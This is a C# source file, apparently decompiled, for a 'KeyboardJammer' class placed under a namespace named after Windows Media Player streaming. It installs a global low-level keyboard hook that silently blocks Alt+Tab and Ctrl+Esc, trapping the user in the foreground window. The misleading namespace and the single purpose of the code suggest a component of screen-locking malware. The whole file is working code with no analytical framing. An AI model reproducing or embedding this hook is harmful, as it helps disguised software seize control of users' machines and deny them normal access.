using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic.Devices;
using WindowsMediaPlayerStreaming.My;

namespace WindowsMediaPlayerStreaming;

public class KeyboardJammer
{
	private delegate int HookCallback(int nCode, int wParam, IntPtr lParam);

	private struct KBDLLHOOKSTRUCT
	{
		public int vkCode;

		public int scanCode;

		public int flags;

		public int time;

		public IntPtr dwExtraInfo;
	}

	private static HookCallback HookDelegate;

	private static int HookId;

	private const int Wh_Keyboard_LL = 13;

	private const int Vk_Tab = 9;

	private const int Vk_Escape = 27;

	[DebuggerNonUserCode]
	public KeyboardJammer()
	{
	}

	private static int KeyBoardHookProc(int nCode, int wParam, IntPtr lParam)
	{
		if (nCode < 0)
		{
			return CallNextHookEx(HookId, nCode, (IntPtr)wParam, lParam);
		}
		object? obj = Marshal.PtrToStructure(lParam, typeof(KBDLLHOOKSTRUCT));
		KBDLLHOOKSTRUCT kBDLLHOOKSTRUCT = default(KBDLLHOOKSTRUCT);
		KBDLLHOOKSTRUCT kBDLLHOOKSTRUCT2 = ((obj != null) ? ((KBDLLHOOKSTRUCT)obj) : kBDLLHOOKSTRUCT);
		if ((kBDLLHOOKSTRUCT2.vkCode == 9) & ((Computer)MyProject.Computer).get_Keyboard().get_AltKeyDown())
		{
			return 1;
		}
		if ((kBDLLHOOKSTRUCT2.vkCode == 27) & ((Computer)MyProject.Computer).get_Keyboard().get_CtrlKeyDown())
		{
			return 1;
		}
		return CallNextHookEx(HookId, nCode, (IntPtr)wParam, lParam);
	}

	public static void Jam()
	{
		if (HookId == 0)
		{
			HookDelegate = KeyBoardHookProc;
			HookId = SetWindowsHookEx(13, HookDelegate, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]), 0);
			if (HookId == 0)
			{
			}
		}
	}

	public static void UnJam()
	{
		UnhookWindowsHookEx(HookId);
	}

	[DllImport("user32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto)]
	private static extern int CallNextHookEx(int idHook, int nCode, IntPtr wParam, IntPtr lParam);

	[DllImport("user32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto, SetLastError = true)]
	private static extern int SetWindowsHookEx(int idHook, HookCallback HookProc, IntPtr hInstance, int wParam);

	[DllImport("user32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto, SetLastError = true)]
	private static extern int UnhookWindowsHookEx(int idHook);
}
